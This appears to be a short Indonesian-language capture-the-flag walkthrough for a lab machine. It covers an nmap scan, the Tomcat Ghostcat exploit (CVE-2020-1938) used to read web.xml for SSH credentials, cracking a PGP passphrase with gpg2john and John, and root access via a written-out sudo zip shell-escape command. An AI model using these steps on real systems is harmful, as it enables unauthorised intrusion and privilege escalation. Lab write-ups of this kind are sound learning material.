# boot:
1. scan nmap ada banyak yg kebuka -> 8080 web nya cek versi apache nya
2. ada tuh cari coba exploitnya kali aja ada -> soalnya di fuzz pun gada apa apa
3. tomcat 9.0.30 -> CVE-2020-1938 -> python3 cve.py -h aja dulu -> cari exploitnya dari github aja
4. nanti ada disuruh port jp apa gitu sama xml nya disuruh ah coba dulu dah
5. ternyata default gini xml nya WEB-INF/web.xml -> juga pake python2 bukan 3 
6. dapet creds ssh aja
7. ls disitu ada gpg sama asc -> coba wget aja biar kesimpen
8. pertama gpg --import namafile.asc -> udah di import next -> gpg -d nama.pgp 
9. butuh passphrase -> hash in itu asc -> gpg2john namafile.asc > namafile.hash
10. john namafile.hash --wordlist=/rockyou.txt -> nemu passphrase masukin aja dapet creds
11. su aja kesitu dah klaim user flag
12. eh pgp nya di mesin target aja dah biar enak -> kebaca kok

# PE :
1. sudo -l -> ada tuh zip run ini aja
2. TF=$(mktemp -u) -> sudo zip $TF /etc/hosts -T -TT 'sh #'
3. itu milih yg sudo di gtfobins
4. klaim root
